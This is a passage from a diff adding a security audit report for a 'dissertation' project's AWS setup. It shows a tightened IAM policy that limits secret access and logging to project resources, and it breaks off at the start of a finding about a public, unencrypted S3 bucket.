+            ]
+        },
+        {
+            "Sid": "AllowSpecificSecretAccess",
+            "Effect": "Allow",
+            "Action": [
+                "secretsmanager:GetSecretValue"
+            ],
+            "Resource": "arn:aws:secretsmanager:eu-west-2:ACCOUNT_ID:secret:dissertation/*"
+        },
+        {
+            "Sid": "AllowCloudWatchLogs",
+            "Effect": "Allow",
+            "Action": [
+                "logs:CreateLogGroup",
+                "logs:CreateLogStream",
+                "logs:PutLogEvents"
+            ],
+            "Resource": "arn:aws:logs:eu-west-2:ACCOUNT_ID:log-group:/dissertation/*"
+        }
+    ]
+}
+```
+
+> **Note:** `secretsmanager:ListSecrets` and `secretsmanager:DeleteSecret` on `Resource: "*"` were also removed — these are dangerous permissions that should be tightly scoped or eliminated.
+
+---
+
+## VULNERABILITY 9: S3 Bucket Publicly Accessible Without Encryption
+
+**File:** `./infrastructure/main.tf`, lines 18–28 and lines 31–33
+**CWE:** CWE-732 — Incorrect Permission Assignment / CWE-311 — Missing Encryption of Sensitive Data
+**OWASP:** A05:2021 — Security Misconfiguration /
